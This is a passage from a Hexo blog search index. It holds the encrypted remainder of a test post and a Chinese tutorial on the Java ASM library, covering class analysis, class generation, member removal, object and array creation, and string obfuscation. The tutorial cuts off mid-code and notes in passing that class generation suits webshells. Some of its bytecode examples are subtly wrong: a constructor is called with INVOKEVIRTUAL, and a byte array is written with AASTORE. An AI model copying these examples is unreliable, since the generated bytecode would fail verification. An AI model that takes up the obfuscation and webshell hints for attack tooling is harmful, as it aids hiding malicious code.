e89949f9489a29752082e64f6ef43250270177a7cc9fc01606703c227262324837c6609aece846ab1eb8a7e6b45e865d5e17991a018e96c65c9f807c58186ad20ded725fb7f82bb57821c97bee1423bc9a309ec24c08625f1cbd077f1b76e1b1063ba6112fe1a41b0c6971932f3acd95738131914e1bae9a159b1b6c62ea5c94286f41262d4a145a1c1283e58ee13e5406335c2b9964bfe27b720b1443d4bfd1e778f6cab472d1a92cff37e379814734c7fc6a9ec7a2436208ab952fb86902ef7bf97377ac4e20720a5983f77f3c38f51c1fcab706adf60dc7fc578211fbeb747bf0942d7fd298467ec0cd085fd0810ba0a8c3502f3b36e20bd206299c8686d3118d40d7aa411244e9c8f5c6fd8d659698a5b1d51ddc2c52a76a6d21d60006e1457c506c206f9a72d75468a56823ecab68a94664dd49e967b0a5c43520d09c0e0030afc8f4bb7a907441e453c054183d9ce5607c8e924ec33fd33bce055b6ddea2d9057b5eeddf61604d605bc929f6a6c4f6dc4f422420ee566619cb619ad8c04ee47c69161a8c8c09d6ba13ff077780b60aed66b0a1a5e559c52dee0e8335541a926b7b1e19e7dfe4f1e5f2bf4e72633632073b38df6bb61a40cf8edf23d833e6c57a5ec4a94a2b40289042e04fb02c4a79d7482e15d688fd91d0072bafea4ffbe108411eb31084a97e0edd42b03149275a79bce2c5ea8557749540f249cc4274628cca29a477bfaf89b9d12d290f4660d126535fc72110e7f8285dced6112cf2abefeee613a971118fa5ddecf6e9d66288a85a424aa570cfc7b71a8b93596974bb39541719b7d556122c394854553186741fc6845ba287daae337456d3b1549babd2668e96c4d3b8dc89e5bdc8dedce2c7df5f25ba4df5483c640b26bf22ab73b2a44660ea4a66cc3dfc061bba0071de53840ebeb0349e5c22f1abef366d0d9b17ae05efc581cd25ee198e3d5c1675c02f1aa5ec5c8334f68e1cb4c1a4d47b7e6866bc5fac90896f79f0621d17f1f187ffa370165eead78239bfae10b215892871cae02665a96f7b88fdb1e45a2c0724f9500cca68bfe23c4bdcc5771da990ce1c2754c4e41e0183e201c51be0c7c4c15e21f2950d6eb8c8975b97c6375c3705fead5651945260d8a0a49d84d49cc91c2012c00fc705fa897d2605bf49e3c91f90c86972856190cec87e98eb1c2d8efa103fec6e491584fbd11a460fac630013532ddf55f975d879c3e8de3350421ab3fac429ca5c472d473625c5d5669e18d1ffcdbafc72ac5973af3983811edbc53b7375ff6a2a48cd9624c21c5a9696cada996000b2505348bb1fcbe22d2edff748fdcedb08a640fc3558fe14bb3f9cde7cac6a25578dea163311125c9da0e892d6a5d648fdc3a1ba608e4bf2580b3eab2f755acd0a18f5964d46644f90267b48502049488b7a982dce5ccff6c74d8478a95fb63e772ba7e87c79fea5584dbf246b2dfda11869369ce1fb7453814fe851ead34c966464f46aa349e87143d6e6027c115b011cf79f74b5d9c691e7c8b30d8317c987e2f84fb82e92f52f76324d67ba37bc37c35d001f78b2b7b25dd739eddc2ebdf3f9ca43f2d6a2feb852455faa363b3cfeddcf02571b6015c3a6af50d626e9c7d684ded2d8a76aa812287134d3efc2bad5ac39e85ea0112c017afc762915aeb26cc643fe8804caf2bafe35faa907197936f6b90ecd7aba7827a007181d8b11c968dd50fde4577783b2256c8020bcb7285f28ad2aba9317be976c65304f71bbe794b6496f92942d223ce9989cdad60e07c6957e686491e1b22bd51f3b6b3cb68a691fc72d3ad34db9871824311f77d01add6ba4d33ca92f6f65661931de74c584e056751fe9b5f01dea09a17cacd512d51d4a39550f7a8b777178fbde700d0c1e14d94bb078cad10f9c0198a8a3d13d907e403f62ebd864f69ef7ee1b81b3cd72436ff67514ae45191bfe8c6f44b1405d0347bbe457176ba201d0120f24b52fd4fcd0f69cc315768d8d6df0f2c7ff5835135346809f12cc113d229bc49a6c0fec4f88a337a39f291921e6394f83ead4bae185e3dcea930192b59a1fe2713e06c075edecfd381890d78d80d1918cc637ea1a0ba50bf10fe2a8fb2bbe275885411c8b44f2eaf1955aad3a5d2698a7182d1382aabde6bee400cdf22150c6d208553978bb45093bbbffc0bfbdf91b6e6881a9819cc4ded76a85353274020f1bf5648a21c0dcfc947b61ccffbd2d25c4136d194e5393ae5188e2262390535c4491a5c9e277c8ff90dbd87239e47ca1ad05536cefa0f4ab3f811586a73822663af170efa98f40a3f3670101aad56977bbabd175a755ce55ae62eb41f1f349b48d1c4b3ceb1fb1fe0b0c518cced9243bb165e61d421d6ccb505bd84ca8cab40461b972a544c73287b6a28c26e64f00e05d346237a85d95c232b518f2550add73f4832137d89c3fc850138b1cddc1fb11ab7dc0cc478579685f4d7c94e943c98a230f3968744cd75aa8279089219ae1776e3a936da3dd0de1bd5</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> test image </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asm</title>
      <link href="/2022/11/19/asm/"/>
      <url>/2022/11/19/asm/</url>
      
        <content type="html"><![CDATA[<h1 id="asm"><a href="#asm" class="headerlink" title="asm"></a>asm</h1><h2 id="分析类"><a href="#分析类" class="headerlink" title="分析类"></a>分析类</h2><p>分析类的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="variable">aBoolean</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello asm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitors类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitors</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitors</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 继承关系</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> version</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> superName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> interfaces</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visit</span><span class="params">(<span class="type">int</span> version,<span class="type">int</span> access,String name,String signature,String superName,String[] interfaces)</span>&#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;extends &quot;</span> + superName + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visit(version,access,name,signature,superName,interfaces);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 属性变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        System.out.println(desc + <span class="string">&quot; &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> access</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> desc</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> signature</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exceptions</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot; &quot;</span> + desc);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过asm框架分析类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnalysisClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MyClassVisitors</span> <span class="variable">myClassVisitors</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitors</span>();</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        classReader.accept(myClassVisitors,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/150936112-ab83838c-4f67-4102-9816-ce2afa734559.png" alt="image-20220125122358358"></p><p><img src="https://user-images.githubusercontent.com/63966847/150936121-914e2c3a-6019-4f01-91ed-38c5453cab39.png" alt="image-20220125122420194"></p><blockquote><p>该部分也是GI的核心。<a href="https://xz.aliyun.com/t/10363">https://xz.aliyun.com/t/10363</a></p></blockquote><h2 id="生成类"><a href="#生成类" class="headerlink" title="生成类"></a>生成类</h2><blockquote><p>感觉用于webshell中。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WriteClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="comment">// java1.8 public修饰 路径 签名 父类 接口</span></span><br><span class="line">        classWriter.visit(V1_8, ACC_PUBLIC, <span class="string">&quot;com/firebasky/utils/asm/learn/Learn2Test&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;java/lang/Object&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//public和static修饰 方法名 描述符 签名 异常</span></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">render</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC + ACC_STATIC, <span class="string">&quot;render&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//插入一个字段是方法里面插入 操作码 路径 名字 描述符</span></span><br><span class="line">        render.visitFieldInsn(GETSTATIC, <span class="string">&quot;java/lang/System&quot;</span>, <span class="string">&quot;out&quot;</span>, <span class="string">&quot;Ljava/io/PrintStream;&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个ldc</span></span><br><span class="line">        render.visitLdcInsn(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">        <span class="comment">//插入一个方法 操作码 路径 方法名 参数 是否为接口的方法</span></span><br><span class="line">        render.visitMethodInsn(INVOKEVIRTUAL, <span class="string">&quot;java/io/PrintStream&quot;</span>, <span class="string">&quot;println&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//插入返回值</span></span><br><span class="line">        render.visitInsn(RETURN);</span><br><span class="line">        <span class="comment">//设置栈和局部变量大小</span></span><br><span class="line">        render.visitMaxs(<span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//结束</span></span><br><span class="line">        render.visitEnd();</span><br><span class="line">        classWriter.visitEnd();</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn2Test</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">render</span><span class="params">()</span> &#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;Hello asm!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="加载或移除类成员"><a href="#加载或移除类成员" class="headerlink" title="加载或移除类成员"></a>加载或移除类成员</h2><p>主程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(Test.class.getName());</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MyClassVisitor</span> <span class="variable">myClassVisitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassVisitor</span>(classWriter);</span><br><span class="line">        classReader.accept(myClassVisitor,<span class="number">0</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyClassVisitor类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassVisitor</span> <span class="keyword">extends</span> <span class="title class_">ClassVisitor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyClassVisitor</span><span class="params">(ClassWriter classWriter)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ASM5, classWriter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FieldVisitor <span class="title function_">visitField</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;aBoolean&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitField(access, name, desc, signature, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc, String signature,String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(name.equals(<span class="string">&quot;render&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitField(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitMethod(ACC_PRIVATE,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>).visitEnd();</span><br><span class="line">        <span class="built_in">super</span>.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.firebasky.utils.asm.learn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">     <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="built_in">this</span>.aBoolean = <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">name</span><span class="params">(String var1)</span> &#123;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建对象和数组"><a href="#创建对象和数组" class="headerlink" title="创建对象和数组"></a>创建对象和数组</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.ClassWriter;</span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.MethodVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> jdk.internal.org.objectweb.asm.Opcodes.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Learn4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">classWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">methodVisitor</span> <span class="operator">=</span> classWriter.visitMethod(ACC_PUBLIC, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;()V&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        methodVisitor.visitTypeInsn(NEW,<span class="string">&quot;java/lang/String&quot;</span>);</span><br><span class="line">        methodVisitor.visitLdcInsn(<span class="string">&quot;xxx&quot;</span>);<span class="comment">//常量</span></span><br><span class="line">        methodVisitor.visitMethodInsn(INVOKEVIRTUAL,<span class="string">&quot;java/lang/String&quot;</span>,<span class="string">&quot;&lt;init&gt;&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)V&quot;</span>,<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">//生成文件</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = classWriter.toByteArray();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;d://1.class&quot;</span>);</span><br><span class="line">        outputStream.write(bytes);</span><br><span class="line">        outputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">2</span>);<span class="comment">//数组长度</span></span><br><span class="line">methodVisitor.visitIntInsn(NEWARRAY,T_BYTE);<span class="comment">//类型是byte</span></span><br><span class="line">methodVisitor.visitInsn(DUP);<span class="comment">//压</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">0</span>);<span class="comment">//插入数组0位置</span></span><br><span class="line">methodVisitor.visitIntInsn(SIPUSH,<span class="number">1</span>);</span><br><span class="line">methodVisitor.visitInsn(AASTORE);<span class="comment">//保存</span></span><br></pre></td></tr></table></figure><h2 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h2><p>就是在写入的时候做一个转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 